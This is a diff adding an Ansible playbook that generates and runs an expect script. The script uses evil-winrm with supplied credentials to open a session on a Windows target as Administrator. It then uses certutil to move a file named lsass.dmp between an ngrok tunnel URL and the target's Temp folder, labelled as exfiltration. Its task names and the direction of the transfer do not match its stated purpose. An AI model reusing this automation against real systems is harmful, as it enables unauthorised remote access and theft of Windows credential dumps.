@@ -1,1 +1,21 @@
+---
+- name: Create evil-winrm send whomai command
+  copy:
+    dest: /opt/winrm.sh
+    content: |
+      #!/usr/bin/expect -f
+      set timeout -1
+      spawn evil-winrm -i {{ target_ip }} -u {{ username }} -p {{ password }}
+      expect "PS C:\\Users\\Administrator\\Documents> "
+      send "certutil -urlcache -split -f {{ ngrok_url.stdout }}/lsass.dmp C:\\Windows\\Temp\\exfil_lsass.dmp\r"
+      expect "PS C:\\Users\\Administrator\\Documents> "
+      send "exit\r"
+      interact
 
+- name: Make thescript executable
+  file:
+    path: /opt/winrm.sh
+    mode: '0755'
+
+- name: Run the evil-winrm
+  shell: /opt/winrm.sh
